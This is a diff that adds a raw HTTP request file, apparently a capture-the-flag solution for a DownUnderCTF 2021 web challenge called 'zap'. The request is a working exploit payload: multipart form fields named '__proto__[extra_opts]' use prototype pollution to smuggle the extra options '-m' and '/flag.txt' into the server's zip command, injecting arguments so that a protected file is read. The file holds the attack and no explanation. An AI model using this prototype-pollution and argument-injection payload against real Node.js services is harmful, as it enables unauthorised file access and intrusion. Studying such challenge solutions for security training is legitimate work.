@@ -1,0 +1,34 @@
+POST /zip HTTP/2
+Host: web-zap-a7f6db448824767e.chal-2021.duc.tf
+Content-Length: 418
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+Origin: https://web-zap-a7f6db448824767e.chal-2021.duc.tf
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD06Z7jN7olxreMX1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.54 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://web-zap-a7f6db448824767e.chal-2021.duc.tf/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+
+------WebKitFormBoundaryD06Z7jN7olxreMX1
+Content-Disposition: form-data; name="file"; filename="pay.txt"
+Content-Type: text/plain
+
+test
+------WebKitFormBoundaryD06Z7jN7olxreMX1
+Content-Disposition: form-data; name="__proto__[extra_opts][0]"
+
+-m
+------WebKitFormBoundaryD06Z7jN7olxreMX1
+Content-Disposition: form-data; name="__proto__[extra_opts][1]"
+
+/flag.txt
+------WebKitFormBoundaryD06Z7jN7olxreMX1--
